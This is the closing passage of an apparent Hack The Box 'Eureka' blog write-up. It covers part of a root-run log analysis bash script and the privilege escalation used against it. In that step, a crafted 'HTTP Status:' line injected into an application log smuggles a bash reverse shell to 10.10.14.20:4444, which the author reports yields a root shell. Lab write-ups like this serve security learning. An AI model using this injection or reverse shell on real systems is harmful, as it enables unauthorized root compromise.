class="hljs-variable">$LOG_FILE</span>&quot;</span>)<br>    eureka_count=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$eureka_errors</span>&quot;</span> | <span class="hljs-built_in">wc</span> -l)<br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n<span class="hljs-variable">$&#123;YELLOW&#125;</span>[+] Eureka Connection Failures:<span class="hljs-variable">$&#123;RESET&#125;</span>&quot;</span><br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;YELLOW&#125;</span>Count: $eureka_count<span class="hljs-variable">$&#123;RESET&#125;</span>&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$eureka_errors</span>&quot;</span> | <span class="hljs-built_in">tail</span> -n 2 | awk -v yellow=<span class="hljs-string">&quot;<span class="hljs-variable">$YELLOW</span>&quot;</span> -v reset=<span class="hljs-string">&quot;<span class="hljs-variable">$RESET</span>&quot;</span> <span class="hljs-string">&#x27;&#123;print yellow $0 reset&#125;&#x27;</span><br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-title">display_results</span></span>() &#123;<br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;BLUE&#125;</span>----- Log Analysis Report -----<span class="hljs-variable">$&#123;RESET&#125;</span>&quot;</span><br><br>    <span class="hljs-comment"># Successful logins</span><br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n<span class="hljs-variable">$&#123;GREEN&#125;</span>[+] Successful Login Counts:<span class="hljs-variable">$&#123;RESET&#125;</span>&quot;</span><br>    total_success=0<br>    <span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;!successful_users[@]&#125;</span>&quot;</span>; <span class="hljs-keyword">do</span><br>        count=<span class="hljs-variable">$&#123;successful_users[$user]&#125;</span><br>        <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GREEN&#125;</span>%6s %s<span class="hljs-variable">$&#123;RESET&#125;</span>\n&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$count</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$user</span>&quot;</span><br>        total_success=$((total_success + count))<br>    <span class="hljs-keyword">done</span><br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GREEN&#125;</span>\nTotal Successful Logins: $total_success<span class="hljs-variable">$&#123;RESET&#125;</span>&quot;</span><br><br>    <span class="hljs-comment"># Failed logins</span><br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n<span class="hljs-variable">$&#123;RED&#125;</span>[+] Failed Login Attempts:<span class="hljs-variable">$&#123;RESET&#125;</span>&quot;</span><br>    total_failed=0<br>    <span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;!failed_users[@]&#125;</span>&quot;</span>; <span class="hljs-keyword">do</span><br>        count=<span class="hljs-variable">$&#123;failed_users[$user]&#125;</span><br>        <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;RED&#125;</span>%6s %s<span class="hljs-variable">$&#123;RESET&#125;</span>\n&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$count</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$user</span>&quot;</span><br>        total_failed=$((total_failed + count))<br>    <span class="hljs-keyword">done</span><br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;RED&#125;</span>\nTotal Failed Login Attempts: $total_failed<span class="hljs-variable">$&#123;RESET&#125;</span>&quot;</span><br><br>    <span class="hljs-comment"># HTTP status codes</span><br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n<span class="hljs-variable">$&#123;CYAN&#125;</span>[+] HTTP Status Code Distribution:<span class="hljs-variable">$&#123;RESET&#125;</span>&quot;</span><br>    total_requests=0<br>    <span class="hljs-comment"># Sort codes numerically</span><br>    IFS=$<span class="hljs-string">&#x27;\n&#x27;</span> sorted=($(<span class="hljs-built_in">sort</span> -n -t<span class="hljs-string">&#x27;:&#x27;</span> -k1 &lt;&lt;&lt;<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;STATUS_CODES[*]&#125;</span>&quot;</span>))<br>    <span class="hljs-built_in">unset</span> IFS<br>    <span class="hljs-keyword">for</span> entry <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;sorted[@]&#125;</span>&quot;</span>; <span class="hljs-keyword">do</span><br>        code=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$entry</span>&quot;</span> | <span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27;:&#x27;</span> -f1)<br>        count=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$entry</span>&quot;</span> | <span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27;:&#x27;</span> -f2)<br>        total_requests=$((total_requests + count))<br>        <br>        <span class="hljs-comment"># Color coding</span><br>        <span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$code</span> =~ ^2 ]]; <span class="hljs-keyword">then</span> color=<span class="hljs-string">&quot;<span class="hljs-variable">$GREEN</span>&quot;</span><br>        <span class="hljs-keyword">elif</span> [[ <span class="hljs-variable">$code</span> =~ ^3 ]]; <span class="hljs-keyword">then</span> color=<span class="hljs-string">&quot;<span class="hljs-variable">$YELLOW</span>&quot;</span><br>        <span class="hljs-keyword">elif</span> [[ <span class="hljs-variable">$code</span> =~ ^4 || <span class="hljs-variable">$code</span> =~ ^5 ]]; <span class="hljs-keyword">then</span> color=<span class="hljs-string">&quot;<span class="hljs-variable">$RED</span>&quot;</span><br>        <span class="hljs-keyword">else</span> color=<span class="hljs-string">&quot;<span class="hljs-variable">$CYAN</span>&quot;</span><br>        <span class="hljs-keyword">fi</span><br>        <br>        <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;color&#125;</span>%6s %s<span class="hljs-variable">$&#123;RESET&#125;</span>\n&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$count</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$code</span>&quot;</span><br>    <span class="hljs-keyword">done</span><br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;CYAN&#125;</span>\nTotal HTTP Requests Tracked: $total_requests<span class="hljs-variable">$&#123;RESET&#125;</span>&quot;</span><br>&#125;<br><br><br><span class="hljs-comment"># Main execution</span><br>analyze_logins<br>analyze_http_statuses<br>display_results | <span class="hljs-built_in">tee</span> <span class="hljs-string">&quot;<span class="hljs-variable">$OUTPUT_FILE</span>&quot;</span><br>analyze_log_errors | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">&quot;<span class="hljs-variable">$OUTPUT_FILE</span>&quot;</span><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n<span class="hljs-variable">$&#123;GREEN&#125;</span>Analysis completed. Results saved to $OUTPUT_FILE<span class="hljs-variable">$&#123;RESET&#125;</span>&quot;</span><br></code></pre></td></tr></table></figure>

<p>Running pspy, we get the following output:</p>
<p><img src="/img/Eureka/pspy.PNG" srcset="/img/loading.gif" lazyload></p>
<p>pspy showed <code>log_analyse.sh</code> being run as root on various application logs, indicating the script executes with high privileges and could be interesting for privilege escalation.</p>
<h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation:"></a>Exploitation:</h3><p>The <code>log_analyse.sh</code> script runs as <strong>root</strong> and processes log files without properly validating their contents. The user <code>miranda-wise</code> belongs to the <code>developers</code> group and has <strong>write permissions</strong> on the log directory, which allows deletion and recreation of log files, even though the script itself runs as root.</p>
<p>This means it is possible to inject specially crafted lines into the log files that match the pattern <code>HTTP Status: …</code>. When the script reads these lines, it interprets part of the content as a shell command and executes it with <strong>root privileges</strong>:</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs swift">miranda<span class="hljs-operator">-</span>wise<span class="hljs-meta">@eureka</span>:<span class="hljs-operator">~</span>$ rm <span class="hljs-operator">-</span>f <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/web/</span>user<span class="hljs-operator">-</span>management<span class="hljs-operator">-</span>service<span class="hljs-regexp">/log/</span>application.log<br><br>miranda<span class="hljs-operator">-</span>wise<span class="hljs-meta">@eureka</span>:<span class="hljs-operator">~</span>$ echo &#x27;<span class="hljs-type">HTTP</span> <span class="hljs-type">Status</span>: x a[$(bash <span class="hljs-operator">-</span>i <span class="hljs-operator">&gt;&amp;</span> <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/10.10.14.20/</span><span class="hljs-number">4444</span> <span class="hljs-number">0</span><span class="hljs-operator">&gt;&amp;</span><span class="hljs-number">1</span>)]&#x27; <span class="hljs-operator">&gt;</span> <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/web/</span>user<span class="hljs-operator">-</span>management<span class="hljs-operator">-</span>service<span class="hljs-regexp">/log/</span>application.log<br><br></code></pre></td></tr></table></figure>

<p>Waited a couple minutes, then got root shell:</p>
<p><img src="/img/Eureka/root.PNG" srcset="/img/loading.gif" lazyload></p>
<h2 id="Thanks-For-Reading"><a href="#Thanks-For-Reading" class="headerlink" title="Thanks For Reading :)))"></a>Thanks For Reading :)))</h2><p><img src="/img/Eureka/ghibli.gif" srcset="/img/loading.gif" lazyload></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Hack-The-Box/" class="print-no-link">#Hack The Box</a>
      
        <a href="/tags/Linux/" class="print-no-link">#Linux</a>
      
        <a href="/tags/Hard/" class="print-no-link">#Hard</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>HTB-Eureka</div>
      <div>https://oumayma18.github.io/2025/09/13/HTB-Eureka/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>Author</div>
          <div>Ouma</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>Posted on</div>
          <div>September 13, 2025</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>Licensed under</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/06/22/HTB-Titanic/" title="HTB-Titanic">
                        <span class="hidden-mobile">HTB-Titanic</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>Table of Contents</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Made With</span></a> <i class="iconfont icon-love"></i> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
  </noscript>
</body>
</html>
